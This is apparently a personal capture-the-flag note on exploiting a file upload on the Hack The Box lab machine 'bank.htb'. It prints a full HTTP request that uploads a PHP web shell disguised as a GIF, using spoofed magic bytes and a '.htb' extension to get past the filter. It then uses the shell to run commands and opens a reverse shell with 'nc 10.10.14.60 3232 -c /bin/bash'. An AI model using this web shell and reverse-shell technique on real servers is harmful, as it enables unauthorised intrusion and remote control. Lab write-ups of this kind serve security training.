<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>php upload</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>php upload</h1><br/>WHEN UPLOADING FILE CAPTURE WITH BURP!!!!!!!<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />POST /support.php HTTP/1.1<br />Host: bank.htb<br />User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://bank.htb/support.php">http://bank.htb/support.php<br /></a><br />Content-Type: multipart/form-data; boundary=---------------------------25819144810188292491428089033<br />Content-Length: 631<br />Cookie: HTBBankAuth=dbo8uvvaj95qmg0ebsgujbrmm2<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br /><br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;title&quot;<br /><br />yeet<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;message&quot;<br /><br />cannon<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;PhpShell.gif.htb&quot;                                This line is also important<br />Content-Type: image/gif<br /><br />GIF89a/ &lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                                                                    THIS IS THE IMPORTANT LINE<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;submitadd&quot;<br /><br /><br />-----------------------------25819144810188292491428089033--<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />needed to change the magic bytes to GIF89a/ so it would be read as a gif<br />replace shell code with generic php call back<br />changed name to PhpShell.gif.htb becasue there is a comment in the responce saying that .htb files will run as .php<br />navigate to /support/ page and hover over most recent upload to see its location (bank.htb/uploads/PhpShell.gif.htb)<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami</a><br />wwwroot<br />in termial nc -nlvp 3232<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc</a><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc%2010.10.14.60%203232%20-c%20/bin/bash"> 10.10.14.60 3232 -c /bin/bash</a><br />enjoy your shell!!!!!</div></body></html>